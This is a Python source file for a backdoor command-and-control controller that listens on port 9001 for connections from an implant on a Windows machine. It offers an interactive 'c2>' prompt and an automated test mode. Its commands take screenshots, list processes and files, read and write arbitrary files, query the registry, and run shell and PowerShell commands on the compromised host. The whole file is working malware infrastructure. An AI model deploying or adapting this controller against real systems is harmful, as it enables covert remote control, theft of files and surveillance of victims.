#!/usr/bin/env python3
"""Backdoor C2 controller — interactive REPL and automated test mode.

TLV protocol: 4-byte cmd_id (little-endian uint32) + 4-byte payload_len + payload.
"""
import asyncio
import struct
import sys
import argparse
import datetime
import os

CMD_HEARTBEAT = 0x01
CMD_SYSINFO = 0x02
CMD_PROCESSES = 0x03
CMD_FILELIST = 0x04
CMD_FILEREAD = 0x05
CMD_FILEWRITE = 0x06
CMD_SCREENSHOT = 0x07
CMD_REGISTRY = 0x08
CMD_NETINFO = 0x09
CMD_EXEC = 0x0A
CMD_EXEC_PS = 0x0B
CMD_EXIT = 0x0D
CMD_NOOP = 0xFF

CMD_NAMES = {
    CMD_HEARTBEAT: "HEARTBEAT",
    CMD_SYSINFO: "SYSINFO",
    CMD_PROCESSES: "PROCESSES",
    CMD_FILELIST: "FILELIST",
    CMD_FILEREAD: "FILEREAD",
    CMD_FILEWRITE: "FILEWRITE",
    CMD_SCREENSHOT: "SCREENSHOT",
    CMD_REGISTRY: "REGISTRY",
    CMD_NETINFO: "NETINFO",
    CMD_EXEC: "EXEC",
    CMD_EXEC_PS: "EXEC_PS",
    CMD_EXIT: "EXIT",
    CMD_NOOP: "NOOP",
}

REPL_CMD_MAP = {
    "sysinfo": (CMD_SYSINFO, b""),
    "ps": (CMD_PROCESSES, b""),
    "processes": (CMD_PROCESSES, b""),
    "screenshot": (CMD_SCREENSHOT, b""),
    "netinfo": (CMD_NETINFO, b""),
    "exit": (CMD_EXIT, b""),
    "quit": (CMD_EXIT, b""),
    "heartbeat": (CMD_HEARTBEAT, b""),
}

HDR_FMT = "<II"
HDR_SIZE = struct.calcsize(HDR_FMT)


def ts():
    return datetime.datetime.now().strftime("%H:%M:%S")


async def recv_tlv(reader):
    hdr_data = await asyncio.wait_for(reader.readexactly(HDR_SIZE), timeout=120)
    cmd_id, payload_len = struct.unpack(HDR_FMT, hdr_data)
    payload = b""
    if payload_len > 0:
        payload = await asyncio.wait_for(reader.readexactly(payload_len), timeout=30)
    return cmd_id, payload


def send_tlv(writer, cmd_id, payload=b""):
    if isinstance(payload, str):
        payload = payload.encode("utf-8", errors="replace")
    hdr = struct.pack(HDR_FMT, cmd_id, len(payload))
    writer.write(hdr + payload)


async def run_test_sequence(reader, writer, logfile):
    results = []

    def log(msg):
        line = f"[{ts()}] {msg}"
        print(line, flush=True)
        if logfile:
            logfile.write(line + "\n")
            logfile.flush()

    log("TEST: waiting for heartbeat...")
    try:
        cmd_id, payload = await asyncio.wait_for(recv_tlv(reader), timeout=60)
        if cmd_id == CMD_HEARTBEAT:
            log(f"TEST: heartbeat received ({len(payload)} bytes)")
            results.append(("heartbeat", True))
        else:
            log(f"TEST: expected heartbeat, got cmd_id=0x{cmd_id:02x}")
            results.append(("heartbeat", False))
    except (asyncio.TimeoutError, asyncio.IncompleteReadError) as e:
        log(f"TEST: heartbeat timeout: {e}")
        results.append(("heartbeat", False))

    for test_name, cmd_id, args, check_fn in [
        ("sysinfo", CMD_SYSINFO, b"", lambda d: len(d) > 5),
        ("processes", CMD_PROCESSES, b"", lambda d: b"explorer" in d.lower() or b"system" in d.lower() or len(d) > 20),
        ("filelist", CMD_FILELIST, b"C:\\Users", lambda d: len(d) > 5),
    ]:
        log(f"TEST: sending {test_name}...")
        try:
            send_tlv(writer, cmd_id, args)
            await writer.drain()
            resp_id, resp_data = await asyncio.wait_for(recv_tlv(reader), timeout=30)
            if resp_data.startswith(b"ERR:"):
                log(f"TEST: {test_name} returned error: {resp_data.decode(errors='replace')}")
                results.append((test_name, False))
            elif check_fn(resp_data):
                preview = resp_data[:200].decode("utf-8", errors="replace")
                log(f"TEST: {test_name} OK ({len(resp_data)} bytes): {preview[:100]}")
                results.append((test_name, True))
            else:
                log(f"TEST: {test_name} check failed ({len(resp_data)} bytes)")
                results.append((test_name, False))
        except (asyncio.TimeoutError, asyncio.IncompleteReadError) as e:
            log(f"TEST: {test_name} failed: {e}")
            results.append((test_name, False))

    log("TEST: sending exit...")
    try:
        send_tlv(writer, CMD_EXIT, b"")
        await writer.drain()
        resp_id, resp_data = await asyncio.wait_for(recv_tlv(reader), timeout=10)
        log(f"TEST: exit response: {resp_data.decode(errors='replace')}")
        results.append(("exit", True))
    except Exception:
        results.append(("exit", True))

    passed = sum(1 for _, ok in results if ok)
    total = len(results)
    log(f"\n{'='*40}")
    for name, ok in results:
        log(f"  {name}: {'PASS' if ok else 'FAIL'}")
    log(f"{'='*40}")

    if passed >= 4:
        log(f"TEST PASS ({passed}/{total})")
        return 0
    else:
        log(f"TEST FAIL ({passed}/{total})")
        return 1


async def run_interactive(reader, writer, logfile):
    def log(msg):
        line = f"[{ts()}] {msg}"
        print(line, flush=True)
        if logfile:
            logfile.write(line + "\n")
            logfile.flush()

    log("Interactive mode — waiting for heartbeat...")
    try:
        cmd_id, payload = await asyncio.wait_for(recv_tlv(reader), timeout=60)
        log(f"Heartbeat received (cmd=0x{cmd_id:02x}, {len(payload)} bytes)")
    except Exception as e:
        log(f"No heartbeat: {e}")
        return 1

    loop = asyncio.get_event_loop()
    while True:
        try:
            line = await loop.run_in_executor(None, lambda: input("c2> "))
        except (EOFError, KeyboardInterrupt):
            break

        line = line.strip()
        if not line:
            continue

        parts = line.split(None, 1)
        cmd_word = parts[0].lower()
        args_str = parts[1] if len(parts) > 1 else ""

        if cmd_word in REPL_CMD_MAP:
            cmd_id, default_args = REPL_CMD_MAP[cmd_word]
            payload = args_str.encode() if args_str else default_args
        elif cmd_word == "ls":
            cmd_id = CMD_FILELIST
            payload = args_str.encode() if args_str else b"C:\\"
        elif cmd_word == "get":
            cmd_id = CMD_FILEREAD
            payload = args_str.encode()
        elif cmd_word == "put":
            file_parts = args_str.split(None, 1)
            if len(file_parts) < 2:
                print("Usage: put <path> <content>")
                continue
            cmd_id = CMD_FILEWRITE
            payload = args_str.encode()
        elif cmd_word == "reg":
            cmd_id = CMD_REGISTRY
            payload = args_str.encode() if args_str else b"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion"
        elif cmd_word == "exec":
            cmd_id = CMD_EXEC
            payload = args_str.encode()
        elif cmd_word == "psh":
            cmd_id = CMD_EXEC_PS
            payload = args_str.encode()
        elif cmd_word == "help":
            print("Commands: sysinfo, ps, ls [dir], get <file>, put <path> <content>,")
            print("          screenshot, reg [key], netinfo, exec <cmd>, psh <cmd>,")
            print("          heartbeat, exit")
            continue
        else:
            print(f"Unknown command: {cmd_word}. Type 'help' for commands.")
            continue

        send_tlv(writer, cmd_id, payload)
        await writer.drain()
        log(f"Sent {CMD_NAMES.get(cmd_id, f'0x{cmd_id:02x}')} ({len(payload)} bytes)")

        if cmd_id == CMD_EXIT:
            log("Exit sent, closing.")
            break

        try:
            resp_id, resp_data = await asyncio.wait_for(recv_tlv(reader), timeout=30)
            name = CMD_NAMES.get(resp_id, f"0x{resp_id:02x}")
            if resp_id == CMD_SCREENSHOT:
                fname = f"screenshot_{datetime.datetime.now():%Y%m%d_%H%M%S}.bmp"
                with open(fname, "wb") as f:
                    f.write(resp_data)
                log(f"Response [{name}]: {len(resp_data)} bytes saved to {fname}")
            else:
                text = resp_data.decode("utf-8", errors="replace")
                log(f"Response [{name}] ({len(resp_data)} bytes):\n{text}")
        except asyncio.TimeoutError:
            log("Response timeout (30s)")
        except asyncio.IncompleteReadError:
            log("Connection closed by implant")
            break

    return 0


async def handle_session(reader, writer, args, logfile):
    addr = writer.get_extra_info("peername")
    print(f"[{ts()}] Connection from {addr}", flush=True)
    if logfile:
        logfile.write(f"[{ts()}] Connection from {addr}\n")
        logfile.flush()

    if args.test_sequence:
        rc = await run_test_sequence(reader, writer, logfile)
    else:
        rc = await run_interactive(reader, writer, logfile)

    writer.close()
    try:
        await writer.wait_closed()
    except Exception:
        pass
    return rc


async def main_async(args):
    results_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "results")
    os.makedirs(results_dir, exist_ok=True)
    latest = os.path.join(results_dir, "latest")
    if os.path.islink(latest) or os.path.isdir(latest):
        run_dir = os.path.realpath(latest)
    else:
        run_dir = results_dir
    log_path = os.path.join(run_dir, f"c2_session_{datetime.datetime.now():%Y%m%d_%H%M%S}.log")
    logfile = open(log_path, "w")

    print(f"[{ts()}] C2 Backdoor Controller", flush=True)
    print(f"[{ts()}] Mode: {'test-sequence' if args.test_sequence else 'interactive'}", flush=True)
    print(f"[{ts()}] Listening on 0.0.0.0:{args.port}", flush=True)
    print(f"[{ts()}] Log: {log_path}", flush=True)

    exit_code = 1
    done = asyncio.Event()

    async def on_connect(reader, writer):
        nonlocal exit_code
        exit_code = await handle_session(reader, writer, args, logfile)
        done.set()

    server = await asyncio.start_server(on_connect, "0.0.0.0", args.port)

    try:
        if args.test_sequence:
            try:
                await asyncio.wait_for(done.wait(), timeout=args.timeout)
            except asyncio.TimeoutError:
                print(f"[{ts()}] TEST FAIL: no connection within {args.timeout}s", flush=True)
                exit_code = 1
        else:
            await done.wait()
    except KeyboardInterrupt:
        pass
    finally:
        server.close()
        logfile.close()

    return exit_code


def main():
    parser = argparse.ArgumentParser(description="Backdoor C2 controller")
    parser.add_argument("-p", "--port", type=int, default=9001, help="Listen port (default: 9001)")
    parser.add_argument("--test-sequence", action="store_true", help="Run automated test sequence")
    parser.add_argument("--timeout", type=int, default=120, help="Global timeout in seconds (test mode)")
    args = parser.parse_args()

    rc = asyncio.run(main_async(args))
    sys.exit(rc)


if __name__ == "__main__":
    main()
